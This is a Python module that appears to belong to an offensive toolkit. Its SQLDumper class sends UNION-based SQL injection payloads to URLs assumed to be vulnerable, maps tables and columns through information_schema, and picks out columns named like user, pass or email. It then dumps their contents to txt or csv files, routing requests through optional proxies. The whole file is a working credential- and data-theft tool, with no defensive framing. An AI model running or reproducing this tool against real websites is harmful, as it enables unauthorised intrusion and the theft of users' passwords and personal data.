"""
SQL Database Dumper Tool Module
Handles extracting and dumping data from vulnerable SQL injection URLs
"""

import requests
import re
import time
from typing import List, Dict, Any, Optional, Tuple
from urllib.parse import urljoin, urlparse, parse_qs
from .progress_logger import ProgressLogger


class SQLDumper:
    """SQL Database dumping tool for vulnerable URLs"""
    
    def __init__(self, proxy_host=None, proxy_port=None, proxy_user=None, proxy_pass=None):
        self.proxies = {}
        self.logger = ProgressLogger()
        self.session = requests.Session()
        
        if proxy_host and proxy_port:
            self._set_proxy(proxy_host, proxy_port, proxy_user, proxy_pass)
    
    def _set_proxy(self, host, port, user=None, passwd=None):
        """Set HTTP/HTTPS proxy"""
        if user and passwd:
            proxy_url = f"http://{user}:{passwd}@{host}:{port}"
        else:
            proxy_url = f"http://{host}:{port}"
        
        self.proxies = {
            'http': proxy_url,
            'https': proxy_url
        }
        self.session.proxies.update(self.proxies)
    
    def set_proxy_from_string(self, proxy_str: str):
        """Parse proxy string: host:port or host:port:user:pass"""
        if not proxy_str:
            return
        
        parts = proxy_str.split(':')
        if len(parts) == 2:
            self._set_proxy(parts[0], parts[1])
        elif len(parts) >= 4:
            self._set_proxy(parts[0], parts[1], parts[2], ':'.join(parts[3:]))
    
    def extract_database_schema(self, url: str, method: str = 'GET') -> Optional[Dict[str, List[str]]]:
        """
        Extract database schema (table names and columns) from vulnerable URL
        
        Args:
            url: Vulnerable URL with SQL injection parameter
            method: HTTP method (GET, POST, etc.)
        
        Returns:
            Dictionary with table names and their columns
        """
        schema = {}
        
        try:
            # Extract parameter name
            param = self._extract_injectable_param(url)
            if not param:
                return None
            
            # Get table names
            tables = self._get_table_names(url, param, method)
            if not tables:
                return None
            
            # Get column info for each table
            for table in tables:
                columns = self._get_table_columns(url, param, method, table)
                schema[table] = columns
            
            return schema
        except Exception as e:
            self.logger.error(f"Error extracting schema: {str(e)}")
            return None
    
    def dump_database_by_keyword(self, url: str, keywords: List[str], 
                                 method: str = 'GET', limit: int = 100) -> Dict[str, List[Dict]]:
        """
        Dump database columns matching keywords (user, pass, email, etc.)
        
        Args:
            url: Vulnerable URL with SQL injection parameter
            keywords: List of keywords to search for (e.g., ['user', 'pass', 'email'])
            method: HTTP method (GET, POST, etc.)
            limit: Maximum rows to extract per column
        
        Returns:
            Dictionary with matched columns and their data
        """
        results = {}
        
        try:
            # Get database schema
            schema = self.extract_database_schema(url, method)
            if not schema:
                self.logger.warning("Could not extract database schema")
                return {}
            
            param = self._extract_injectable_param(url)
            if not param:
                return {}
            
            # Search for matching columns
            matching_columns = self._find_matching_columns(schema, keywords)
            
            self.logger.info(f"Found {len(matching_columns)} columns matching keywords")
            
            # Dump data from each matching column
            for table, columns in matching_columns.items():
                for col in columns:
                    data = self._dump_column_data(url, param, method, table, col, limit)
                    if data:
                        key = f"{table}.{col}"
                        results[key] = data
                    time.sleep(0.5)  # Rate limiting
            
            return results
        except Exception as e:
            self.logger.error(f"Error dumping database: {str(e)}")
            return {}
    
    def get_database_info(self, url: str, method: str = 'GET') -> Optional[Dict[str, Any]]:
        """Get database version, user, and other metadata"""
        try:
            param = self._extract_injectable_param(url)
            if not param:
                return None
            
            info = {}
            
            # Database version
            version = self._extract_info_from_query(url, param, method, 
                                                    "SELECT @@version", "version")
            info['version'] = version
            
            # Database user
            user = self._extract_info_from_query(url, param, method,
                                                "SELECT USER()", "user")
            info['current_user'] = user
            
            # Database name
            db = self._extract_info_from_query(url, param, method,
                                              "SELECT DATABASE()", "database")
            info['database'] = db
            
            return info
        except Exception as e:
            self.logger.error(f"Error getting database info: {str(e)}")
            return None
    
    def _extract_injectable_param(self, url: str) -> Optional[str]:
        """Extract injectable parameter name from URL"""
        try:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            
            if params:
                # Return first parameter
                return list(params.keys())[0]
            
            return None
        except:
            return None
    
    def _get_table_names(self, url: str, param: str, method: str) -> Optional[List[str]]:
        """Extract table names from information_schema"""
        try:
            # SQL to get table names
            payload = "1' UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database() -- -"
            
            test_url = self._inject_payload(url, param, payload)
            response = self.session.request(method, test_url, timeout=10)
            
            # Simple extraction - look for table names in response
            tables = self._extract_from_response(response.text, r'(\w+)')
            return tables if tables else None
        except:
            return None
    
    def _get_table_columns(self, url: str, param: str, method: str, 
                          table: str) -> List[str]:
        """Extract column names from specific table"""
        try:
            payload = f"1' UNION SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='{table}' -- -"
            
            test_url = self._inject_payload(url, param, payload)
            response = self.session.request(method, test_url, timeout=10)
            
            columns = self._extract_from_response(response.text, r'(\w+)')
            return columns if columns else []
        except:
            return []
    
    def _find_matching_columns(self, schema: Dict[str, List[str]], 
                              keywords: List[str]) -> Dict[str, List[str]]:
        """Find columns matching any keyword"""
        matching = {}
        keywords_lower = [k.lower() for k in keywords]
        
        for table, columns in schema.items():
            matched_cols = []
            for col in columns:
                if any(keyword in col.lower() for keyword in keywords_lower):
                    matched_cols.append(col)
            
            if matched_cols:
                matching[table] = matched_cols
        
        return matching
    
    def _dump_column_data(self, url: str, param: str, method: str,
                         table: str, column: str, limit: int = 100) -> List[str]:
        """Extract data from specific column"""
        try:
            payload = f"1' UNION SELECT GROUP_CONCAT(DISTINCT {column} SEPARATOR '|') FROM {table} LIMIT {limit} -- -"
            
            test_url = self._inject_payload(url, param, payload)
            response = self.session.request(method, test_url, timeout=10)
            
            # Extract data separated by pipe
            match = re.search(r'([a-zA-Z0-9_\-\.@]+(?:\|[a-zA-Z0-9_\-\.@]+)*)', response.text)
            if match:
                data = match.group(1).split('|')
                return [d.strip() for d in data if d.strip()]
            
            return []
        except:
            return []
    
    def _extract_info_from_query(self, url: str, param: str, method: str,
                                query: str, extract_pattern: str) -> Optional[str]:
        """Extract info from database using UNION injection"""
        try:
            payload = f"1' UNION SELECT {query} -- -"
            
            test_url = self._inject_payload(url, param, payload)
            response = self.session.request(method, test_url, timeout=10)
            
            # Simple extraction
            match = re.search(r'(\w+[\w\s\.\-]*)', response.text)
            return match.group(1) if match else None
        except:
            return None
    
    def _inject_payload(self, url: str, param: str, payload: str) -> str:
        """Inject SQL payload into URL"""
        try:
            if '?' in url:
                separator = '&'
            else:
                separator = '?'
            
            # Simple injection
            return url + separator + f"{param}={payload}"
        except:
            return url
    
    def _extract_from_response(self, response_text: str, pattern: str) -> List[str]:
        """Extract values from response using regex"""
        try:
            matches = re.findall(pattern, response_text)
            return list(set([m.strip() for m in matches if m.strip()]))
        except:
            return []
    
    def export_dump_to_file(self, data: Dict[str, List[str]], filename: str, 
                           format_type: str = 'txt') -> bool:
        """Export dumped data to file"""
        try:
            if format_type == 'txt':
                with open(filename, 'w', encoding='utf-8') as f:
                    for key, values in data.items():
                        f.write(f"\n{'='*60}\n")
                        f.write(f"Column: {key}\n")
                        f.write(f"Records: {len(values)}\n")
                        f.write(f"{'='*60}\n")
                        for value in values:
                            f.write(f"{value}\n")
                
                self.logger.info(f"Dump exported to {filename}")
                return True
            
            elif format_type == 'csv':
                import csv
                with open(filename, 'w', newline='', encoding='utf-8') as f:
                    for key, values in data.items():
                        f.write(f"\n# Column: {key}\n")
                        writer = csv.writer(f)
                        for value in values:
                            writer.writerow([value])
                
                self.logger.info(f"Dump exported to {filename}")
                return True
            
            return False
        except Exception as e:
            self.logger.error(f"Error exporting dump: {str(e)}")
            return False
